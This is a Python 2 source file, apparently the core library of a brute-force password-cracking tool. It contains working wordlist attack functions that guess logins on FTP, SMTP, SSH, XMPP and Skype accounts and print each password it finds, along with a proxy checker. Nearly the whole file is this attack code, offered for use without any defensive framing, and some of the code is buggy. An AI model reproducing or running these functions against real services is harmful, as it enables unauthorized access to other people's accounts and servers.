  # -*- coding: utf-8 -*-
  
################################################################
# TODO: Seperate method to read and seperate words in wordlist.
# TODO: Wordlist generator
# TODO: More protocols. Fix twitter bruteforce.
# TODO: problems persist when using different SMTP ports.
################################################################

'''
mainLib.py - Core methods and global variables that occur after user parsing and initial
             output.
'''


# Comes with Python. These should be core libraries.

import socket, os, requests
from time import sleep
from sys import *
from random import *
from subprocess import call

# New stuff! Should be installed thru requirements.txt.

import smtplib, argparse, paramiko, skpy, mechanize
from xmpp import *
from ftplib import FTP

################################################################
# Global variables and configurations!!
################################################################

W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray


def proxyServer(proxy):
    proxy = open(proxy, 'r')
    for i in proxy.readlines():
        proxyaddr = i.strip("\n")
        try:
            proxies = {"http" : "http://"+str(proxyaddr)}
            r = requests.get("http://google.com", proxies=proxies)
            print G + "[✓]" + W + (" Proxy %s is found! " % proxyaddr)
        except requests.exceptions.ProxyError:
            print R + "[X]" + W + (" Proxy %s is NOT found!" % proxyaddr)

        proxy.close()

################################################################
# FTP bruteforce attack! Works like other attacks. Connects to
# address and port, and attempts to login. On exceptions, return
# errors.
################################################################

def ftpBruteforce(address, username, wordlist, delay, port):
    wordlist = open(wordlist, 'r')
    for i in wordlist.readlines():
        password = i.strip("\n")
        try:
            ftp = FTP()
            ftp.connect(address, port)
            ftp.login(username, password)
            ftp.retrlines('LIST')
            print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
            ftp.quit()
        # TODO: Change to specific exception.
        except ftplib.all_errors as e:
            print R + "[!] OOPs something went wrong! Check if you have typed everything correctly, as well as the FTP directory and port [!]" + W
        except KeyboardInterrupt:
            ftp.quit()
        except:
             print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
             sleep(delay)

################################################################
# smtpBruteforce() method. Attacks SMTP protocol, aka email.
# Attempts connection with SMTP server, and starts attack.
################################################################

def smtpBruteforce(address, username, wordlist, delay, port):
    wordlist = open(wordlist, 'r')
    for i in wordlist.readlines():
        password = i.strip("\n")
        try:
            s = smtplib.SMTP(str(address), port)
            s.ehlo()
            s.starttls()
            s.ehlo
            s.login(str(username), str(password))
            print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
            s.close()
        except Exception, e:
            print R + "[!] OOPs something went wrong! Check if you have typed everything correctly, as well as the email address [!]" + W
        except KeyboardInterrupt:
            s.close()
            exit(1)
        except:
             print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
             sleep(delay)


################################################################
# ssh_connect() for Paramiko. This method is mainly there to
# setup the SSHClient() and actually connecting to the host.
# Success/Error codes are returned to the sshBruteforce() method.
# The code is processed to return an output that tells the user
# if the attack was successful or not.
################################################################

def ssh_connect(address, username, password, port, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    paramiko.util.log_to_file("filename.log")

    try:
        # Connecting! Errors are indicated by code variable.
        ssh.connect(address, port=int(port), username=username, password=password)
    except paramiko.AuthenticationException:
        # Password did not authenticate.
        code = 1
    except socket.error, e:
        # Something went wrong.
        print R + "[!] Error: Connection Failed. [!]" + W
        code = 2

    ssh.close()
    return code



def sshBruteforce(address, username, wordlist, port, delay):
    wordlist = open(wordlist, 'r')
    # Processing wordlist...
    for i in wordlist.readlines():
        password = i.strip("\n")
        try:
            response = ssh_connect(address, username, password, port)
            if response == 0:
                print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
            elif response == 1:
                print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
                sleep(delay)
            elif response == 2:
                print R + "[!] Error: Connection couldn't be established to address. Check if host is correct, or up! [!]" + W
                exit()
        except Exception, e:
            print e
            pass
        except KeyboardInterrupt:
            ssh.close()
            exit()

        wordlist.close()

################################################################
# Bruteforcing XMPP. Getting client, doing standard Wordlist processing,
# and then attempting bruteforce.
################################################################

def xmppBruteforce(address, port, username, wordlist, delay):
    xmppUser = username + "@" + str(address)
    wordlist = open(wordlist, 'r')
    for i in wordlist.readlines():
        password = i.strip("\n")
        try:
            jid = protocol.JID(xmppUser)
            client = client(jid.getDomain(), debug = [])
            client.connect(str(address), port)
            if client.auth(jid.getNode(), password):
                client.sendInitPresence()
                print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
                client.disconnect()
                exit()
        except KeyboardInterrupt:
            client.disconnect()
            exit()
        except:
            print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
            sleep(delay)

################################################################
#
################################################################

def skypeBruteforce(username, wordlist, delay):
    wordlist = open(wordlist, 'r')
    # Processing wordlist...
    for i in wordlist.readlines():
        password = i.strip("\n")
        try:
            sk = skpy.Skype(username, password)
            print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
            exit()
        except skpy.core.SkypeAuthException:
            print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
            sleep(delay)
